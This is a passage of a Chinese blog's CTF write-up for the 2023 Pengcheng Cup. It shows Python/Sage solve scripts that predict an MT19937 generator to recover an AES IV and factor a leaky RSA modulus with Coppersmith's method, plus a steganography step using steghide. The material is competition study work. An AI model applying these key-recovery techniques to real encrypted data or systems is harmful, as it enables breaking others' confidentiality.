class="hljs-string">b&#x27;cTmkMb\xfc\x05|\x1d\xc7\x13\xbaSe\xe0\xbd\xc0\xd9\xa3\x8cwo\x82yN[B&amp;\x80\xd7KPwQ`\x9c\xbf&lt;y\x8e\x8a\x97e\xa074\xb2&#x27;</span><br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> mt19937predictor <span class="hljs-keyword">import</span> MT19937Predictor<br><br>p = <span class="hljs-number">293423658885957174953198318664231534672400520068303593221989900395768107225130267646792968959460384248015583618158947268381852534151783869878808621629530642974652628810907251607210136313789978156955302211733219987661815438401343683</span><br>key1 = long_to_bytes(p)[:-<span class="hljs-number">64</span>]<br><br><br>predictor = MT19937Predictor()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ns:predictor.setrandbits(i % p, <span class="hljs-number">256</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> A:predictor.setrandbits(i, <span class="hljs-number">512</span>)<br><br>iv = long_to_bytes(predictor.getrandbits(<span class="hljs-number">128</span>))<br>aes = AES.new(key1,AES.MODE_CBC,iv)<br>flag = aes.decrypt(enc)<br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#flag&#123;86baa4ed-5ec7-11ee-ae14-ac1203ab14da&#125;</span><br></code></pre></td></tr></table></figure>

<h2 id="LeakyRSA"><a href="#LeakyRSA" class="headerlink" title="LeakyRSA"></a>LeakyRSA</h2><p>先求出p和q的高位，低位用copper，中间用爆破，epsilon=0.01</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python">N = <span class="hljs-number">73822410148110759760164946405270228269255384237831275745269402590230495569279769799226813942899942423718229747478982630879557319063920515141217164980012063064986634632452289290326704640527699568662492105204165609614169349755365956569362139057327962393611139347462018186440108621311077722819578905265976612923</span><br>gift = <span class="hljs-number">2223117424030234543005449667053988296724455736030907136592525175314696509716321</span><br>gift &lt;&lt;=<span class="hljs-number">250</span><br>PR.&lt;x&gt; = PolynomialRing(Zmod(N))<br>ok = <span class="hljs-literal">False</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pq_xor</span>(<span class="hljs-params">tp,tq,idx</span>):<br>    <span class="hljs-keyword">global</span> ok <br>    <br>    <span class="hljs-keyword">if</span> ok:<br>        <span class="hljs-keyword">return</span> <br>    <span class="hljs-keyword">if</span> tp*tq&gt;N:<br>        <span class="hljs-keyword">return</span> <br>    <span class="hljs-keyword">if</span> (tp+(<span class="hljs-number">2</span>&lt;&lt;idx))*(tq+(<span class="hljs-number">2</span>&lt;&lt;idx))&lt;N:<br>        <span class="hljs-keyword">return</span> <br>        <br>    <span class="hljs-keyword">if</span> idx&lt;=<span class="hljs-number">250</span>:<br>        <span class="hljs-keyword">try</span>:<br>            f = tp + x <br>            rr = f.monic().small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">250</span>, beta=<span class="hljs-number">0.45</span>,epsilon=<span class="hljs-number">0.01</span>)<br>            <span class="hljs-built_in">print</span>(rr)<br>            <span class="hljs-keyword">if</span> rr != []:<br>                <span class="hljs-built_in">print</span>(rr)<br>                <span class="hljs-built_in">print</span>(tp)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p = &#x27;</span>,f(rr[<span class="hljs-number">0</span>]))<br>                ok = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        <br>        <span class="hljs-keyword">return</span><br>    <br>    idx -=<span class="hljs-number">1</span><br>    b = (gift &gt;&gt;idx)&amp;<span class="hljs-number">1</span><br>    one = <span class="hljs-number">1</span>&lt;&lt;idx <br>    <span class="hljs-keyword">if</span> b==<span class="hljs-number">0</span>:<br>        pq_xor(tp,tq,idx)    <br>        pq_xor(tp+one,tq+one,idx)    <br>    <span class="hljs-keyword">else</span>:   <span class="hljs-comment">#1</span><br>        pq_xor(tp+one,tq,idx)<br>        pq_xor(tp,tq+one,idx)<br><br>tp = <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">511</span><br>tq = <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">511</span><br>pq_xor(tp,tq,<span class="hljs-number">511</span>)<br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">6814449132912466352143200200256605077873329465758477832056090562012411200107156482645933890997787435093806046493913273252717701817613907418845774345791241</span><br>q = <span class="hljs-number">10833217580503000698385694268032196544400600307706228180481286239545614448110770843300361411809086269809006469621399256214887200838529724133384063799751203</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">71808322808599218331233291542779486534747913572475630198802984648982830332628443972652322590637382696027943799004331488098592525306523343649935216419522329722152742610560398216737030893090641493326477786720839849938277402743820773957184083430369443325368720115515840174745825798187125454448297155036065857691</span><br>n = p*q<br>phi = (q-<span class="hljs-number">1</span>)*(p-<span class="hljs-number">1</span>)<br>d = inverse(e, phi) <br><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><span class="hljs-comment">#flag&#123;6eb67115-38b1-4e75-b3fc-de3a9697e565&#125;</span><br></code></pre></td></tr></table></figure>

<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="我的壁纸"><a href="#我的壁纸" class="headerlink" title="我的壁纸"></a>我的壁纸</h2><p>foremost分出三个文件<br>对flag.txt解snow隐写 key在jpg文件尾；flag.wav解SSTV；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide extract -sf youshouldknowme.jpeg -p 7hR@1nB0$&amp;<br><br><span class="hljs-built_in">cat</span> flag.txt<br><br>flag&#123;b921323f-<br></code></pre></td></tr></table></figure>

<p><code>flag&#123;b921323f-eaa2-4d62-ace6-f86361842eb8&#125;</code></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
  
  
    <span>></span>
    
  <a href="/categories/CTF/Write-Up/" class="category-chain-item">Write Up</a>
  
  

  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E9%B9%8F%E5%9F%8E%E6%9D%AF/">#鹏城杯</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>2023鹏城杯初赛</div>
      <div>http://example.com/2023/11/04/2023鹏城杯/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>g0at</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年11月4日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/11/25/2023%E5%85%A8%E5%9B%BD%E6%99%BA%E8%83%BD%E9%A9%BE%E9%A9%B6%E6%8C%91%E6%88%98%E8%B5%9B/" title="2023全国智能驾驶测试赛">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">2023全国智能驾驶测试赛</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/09/23/USB%E6%B5%81%E9%87%8F/" title="一些USB流量分析">
                        <span class="hidden-mobile">一些USB流量分析</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"rF6DPbqXmz9oaKXSwioOtyuv-gzGzoHsz","appKey":"7WylA7nweHQ3Z3Y3lnez5NTm","path":"window.location.pathname","placeholder":"来唠嗑","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       Hor1zon <i class="iconfont icon-love"></i> g0at 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
